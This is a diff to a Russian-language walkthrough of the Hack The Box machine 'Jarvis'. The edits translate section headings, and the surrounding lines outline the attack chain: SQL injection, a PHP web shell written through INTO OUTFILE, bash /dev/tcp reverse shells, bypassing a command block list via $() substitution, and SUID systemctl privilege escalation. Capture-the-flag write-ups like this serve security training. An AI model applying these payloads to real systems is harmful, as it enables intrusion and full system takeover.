@@ -10,7 +10,7 @@
 ## Цепочка Атаки
 
 ```text
-Reconnaissance
+Разведка
 ├── nmap -sC -sV -p- jarvis.htb → 22 (SSH), 80 (Apache "Stark Hotel"), 64999 (Apache + fail2ban)
 ├── gobuster → /phpmyadmin/, /images/, /js/, /css/, /fonts/
 └── /rooms-suites.php → ссылки /room.php?cod=N
@@ -24,13 +24,13 @@ SQL Injection (manual, no sqlmap)
 ├── File_priv=Y, secure_file_priv='' → запись файлов разрешена
 └── hashcat -m 300 → <PASSWORD>
 
-Foothold (RCE via INTO OUTFILE)
+Первичный Доступ (RCE via INTO OUTFILE)
 ├── LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf') → DocumentRoot: /var/www/html
 ├── INTO OUTFILE '/var/www/html/x.php' с hex от <?php system($_GET['x']); ?>
 ├── curl x.php?x=id → uid=33(www-data)
 └── Reverse shell через bash + /dev/tcp → www-data
 
-Lateral Movement (www-data → pepper)
+Боковое Перемещение (www-data → pepper)
 ├── sudo -l → (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
 ├── simpler.py: forbidden = ['&', ';', '-', '`', '||', '|']
 ├── Обход через $() - command substitution не заблокирован
@@ -38,7 +38,7 @@ Lateral Movement (www-data → pepper)
 ├── sudo -u pepper simpler.py -p → Enter an IP: $(/tmp/shell.sh)
 └── Shell от pepper → user.txt
 
-Privilege Escalation (pepper → root)
+Повышение Привилегий (pepper → root)
 ├── find / -perm -4000 → /bin/systemctl (SUID root:pepper)
 ├── cat /home/pepper/root.service (Type=oneshot, ExecStart=bash reverse shell)
 ├── /bin/systemctl link /home/pepper/root.service
